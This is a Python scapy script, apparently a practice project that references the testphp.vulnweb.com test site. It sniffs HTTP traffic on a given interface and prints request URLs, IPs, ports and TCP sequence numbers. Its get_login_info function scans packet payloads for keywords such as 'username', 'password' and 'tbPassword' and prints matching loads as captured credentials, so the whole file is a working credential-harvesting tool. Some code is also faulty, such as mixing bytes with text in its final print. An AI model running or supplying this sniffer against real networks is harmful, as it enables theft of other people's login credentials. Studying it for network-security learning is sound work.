from os import access
import scapy.all as scapy
import sys
import argparse
from scapy.layers import http,inet

from colorama import Fore, Back, Style

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to 	sniff packets")
    arguments = parser.parse_args()
    return arguments.interface
    
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)
    


def get_url(packet):
    #print(scapy.packet.getlayer())i
    url = (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
    print(url)
    if(url == b'testphp.vulnweb.com/cart.php'):
        return b"testphp.vulnweb.com/login.php"
    else:
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
# A function that returns the Source Ip of the Packet
def get_src_ip(packet):
    print (packet.payload.layers())
    print(inet.TCP)
    try:
        # Check if their is source Ip then return it
        if inet.IP in packet:
            return packet[inet.IP].src
    except:
        return "Hidden Source Ip"
# A function that returns the Destination Ip of the Packet
def get_des_ip(packet):
    try:
        #Check if there is Destination Ip then Return it!
        if inet.IP in packet:
            return packet[inet.IP].dst
    except:
        return "Hidden Destination Ip"
    #return "4"#packet[http.IP].src

# A function that Returns the Source Port
def get_src_port(packet):
    try:
        if inet.TCP in packet:
            return packet[inet.TCP].sport
    except:
        return "Hidden Source Port"
# A function that returns the Destination Port
def get_des_port(packet):
    #proto_field = packet.get_field('proto')
    #print(proto_field.i2s[packet.proto])
    try:
        if inet.TCP in packet:
          
            #return proto_field.i2s[pkt.proto]
            return packet[inet.TCP].dport
    except:
        return "Hidden Destination Port"

# A function that returns the Sequence Number
def get_seq_number(packet):
    #proto_field = packet.get_field('proto')
    #print(proto_field.i2s[packet.proto])
    try:
        if inet.TCP in packet:
          
            #return proto_field.i2s[pkt.proto]
            return packet[inet.TCP].seq
    except:
        return "Hidden Sequence Number"

        # A function that returns the Ack Number
def get_ack_number(packet):
    #proto_field = packet.get_field('proto')
    #print(proto_field.i2s[packet.proto])
    try:
        if inet.TCP in packet:
          
            #return proto_field.i2s[pkt.proto]
            return packet[inet.TCP].ack
    except:
        return "Hidden Acknowledge Number"

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "password", "pass", "login","Username","Password", "tbPassword" , "tbUsername"]
        
        for keyword in keywords:
            try:
                if keyword in load.decode("utf-8"):
                    return load
            except:
                print("some issues")
                break

# A function that Runs after the packet has been catch
def process_sniffed_packets(packet):
    #If the packet has layer then
    if packet.haslayer(http.HTTPRequest):
        #Getting the Information and Printing it
        print(Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")
        url = get_url(packet)
        ip_src =  get_src_ip(packet)
        ip_des =  get_des_ip(packet)
        port_src = get_src_port(packet)
        port_des = get_des_port(packet)
        seq_num = get_seq_number(packet)
        ack_num = get_ack_number(packet)
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " HTTP Request       : " + Fore.YELLOW  + url.decode("utf-8"))
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Source Ip          : " + Fore.YELLOW + ip_src)
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Destination Ip     : " + Fore.YELLOW + ip_des)
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Source Port        : " + Fore.YELLOW + str(port_src))
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Destination Port   : " + Fore.YELLOW + str(port_des))
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Sequence Number    : " + Fore.YELLOW + str(seq_num))
        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Acknowledge Number : " + Fore.YELLOW + str(ack_num))
        print( Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")
        login_info = get_login_info(packet)
        
       

        if login_info:
            print(b"[+] Possible username/password >" + Back.RED + Fore.YELLOW + login_info + Back.BLACK + b"nn")
            print( Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")



iface = get_interface()
sniff(iface)
